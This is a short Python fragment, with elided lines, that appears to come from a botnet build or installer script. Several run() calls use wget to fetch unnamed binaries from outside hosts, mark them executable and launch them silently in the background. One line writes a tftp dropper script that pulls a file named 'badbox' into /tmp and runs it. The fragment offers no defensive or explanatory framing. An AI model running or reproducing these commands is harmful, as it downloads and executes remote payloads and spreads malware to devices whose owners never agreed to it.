...
for cc in ccs:
    ...
    run("wget -q http://nerdkkk.tk/HjT5Rk -O .l; chmod +x .l; nohup ./.l </dev/null >/dev/null 2>&1")
    num += 1
...
for i in compileas:
    ...
    run("wget -q http://autoinstaller.us/NsfjSh -O .l; chmod +x .l; nohup ./.l </dev/null >/dev/null 2>&1")
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
    run("wget -q http://leakedfiles.org/files/NsfjSh -O .l; chmod +x .l; nohup ./.l </dev/null >/dev/null 2>&1")
